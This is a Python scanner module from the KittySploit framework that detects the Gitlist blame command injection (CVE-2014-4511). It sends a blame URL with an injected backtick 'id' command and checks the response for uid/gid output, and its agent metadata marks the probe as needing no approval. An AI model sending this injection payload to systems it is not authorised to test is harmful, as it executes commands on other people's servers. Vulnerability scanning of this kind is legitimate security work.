#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Gitlist blame path command injection (CVE-2014-4511)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Gitlist - blame Command Injection Detection (CVE-2014-4511)',
        'description': (
            'Detects CVE-2014-4511 by requesting <repo>/blame/master/""</`id` '
            'after discovering a repository link on the Gitlist index.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'gitlist', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-4511',
        ],
        'cve': 'CVE-2014-4511',
    }

    def run(self):
        for base in ('', '/gitlist', '/git'):
            idx = self.http_request(method='GET', path=f'{base}/', allow_redirects=False)
            if not idx:
                continue
            body = idx.text or ''
            if 'GitList' not in body and 'gitlist' not in body.lower() and 'Powered by' not in body:
                continue
            m = re.search(
                r'class="icon-folder-open icon-spaced"></i>\s*<a href="([^"]+)">',
                body,
            )
            if not m:
                continue
            repo = m.group(1)
            if not repo.endswith('/'):
                repo = repo + '/'
            path = repo + 'blame/master/""</%60id%60'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'uid=\d+.*gid=\d+', r.text or ''):
                self.set_info(
                    severity='critical',
                    reason='Gitlist blame RCE (CVE-2014-4511)',
                    path=repo,
                )
                return True
        return False
